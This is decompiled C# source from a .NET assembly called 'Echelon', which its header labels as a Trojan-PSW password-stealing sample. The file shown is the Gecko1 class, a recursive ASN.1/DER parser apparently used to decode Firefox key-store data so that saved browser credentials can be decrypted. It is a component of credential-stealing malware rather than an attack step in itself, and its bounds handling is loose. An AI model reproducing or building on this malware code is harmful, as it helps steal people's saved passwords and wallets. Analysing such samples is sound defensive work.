// Decompiled with JetBrains decompiler
// Type: Echelon.Gecko1
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;

namespace Echelon
{
  public class Gecko1
  {
    public static Gecko4 Create(byte[] dataToParse)
    {
      Gecko4 gecko4 = new Gecko4();
      for (int index = 0; index < dataToParse.Length; ++index)
      {
        Gecko2 gecko2 = (Gecko2) dataToParse[index];
        int num = 0;
        switch (gecko2)
        {
          case Gecko2.Integer:
            gecko4.Objects.Add(new Gecko4()
            {
              ObjectType = Gecko2.Integer,
              ObjectLength = (int) dataToParse[index + 1]
            });
            byte[] destinationArray1 = new byte[(int) dataToParse[index + 1]];
            int length1 = index + 2 + (int) dataToParse[index + 1] > dataToParse.Length ? dataToParse.Length - (index + 2) : (int) dataToParse[index + 1];
            Array.Copy((Array) dataToParse, index + 2, (Array) destinationArray1, 0, length1);
            gecko4.Objects[gecko4.Objects.Count - 1].ObjectData = destinationArray1;
            index = index + 1 + gecko4.Objects[gecko4.Objects.Count - 1].ObjectLength;
            break;
          case Gecko2.OctetString:
            gecko4.Objects.Add(new Gecko4()
            {
              ObjectType = Gecko2.OctetString,
              ObjectLength = (int) dataToParse[index + 1]
            });
            byte[] destinationArray2 = new byte[(int) dataToParse[index + 1]];
            int length2 = index + 2 + (int) dataToParse[index + 1] > dataToParse.Length ? dataToParse.Length - (index + 2) : (int) dataToParse[index + 1];
            Array.Copy((Array) dataToParse, index + 2, (Array) destinationArray2, 0, length2);
            gecko4.Objects[gecko4.Objects.Count - 1].ObjectData = destinationArray2;
            index = index + 1 + gecko4.Objects[gecko4.Objects.Count - 1].ObjectLength;
            break;
          case Gecko2.ObjectIdentifier:
            gecko4.Objects.Add(new Gecko4()
            {
              ObjectType = Gecko2.ObjectIdentifier,
              ObjectLength = (int) dataToParse[index + 1]
            });
            byte[] destinationArray3 = new byte[(int) dataToParse[index + 1]];
            int length3 = index + 2 + (int) dataToParse[index + 1] > dataToParse.Length ? dataToParse.Length - (index + 2) : (int) dataToParse[index + 1];
            Array.Copy((Array) dataToParse, index + 2, (Array) destinationArray3, 0, length3);
            gecko4.Objects[gecko4.Objects.Count - 1].ObjectData = destinationArray3;
            index = index + 1 + gecko4.Objects[gecko4.Objects.Count - 1].ObjectLength;
            break;
          case Gecko2.Sequence:
            byte[] numArray;
            if (gecko4.ObjectLength == 0)
            {
              gecko4.ObjectType = Gecko2.Sequence;
              gecko4.ObjectLength = dataToParse.Length - (index + 2);
              numArray = new byte[gecko4.ObjectLength];
            }
            else
            {
              gecko4.Objects.Add(new Gecko4()
              {
                ObjectType = Gecko2.Sequence,
                ObjectLength = (int) dataToParse[index + 1]
              });
              numArray = new byte[(int) dataToParse[index + 1]];
            }
            num = numArray.Length > dataToParse.Length - (index + 2) ? dataToParse.Length - (index + 2) : numArray.Length;
            Array.Copy((Array) dataToParse, index + 2, (Array) numArray, 0, numArray.Length);
            gecko4.Objects.Add(Gecko1.Create(numArray));
            index = index + 1 + (int) dataToParse[index + 1];
            break;
        }
      }
      return gecko4;
    }
  }
}
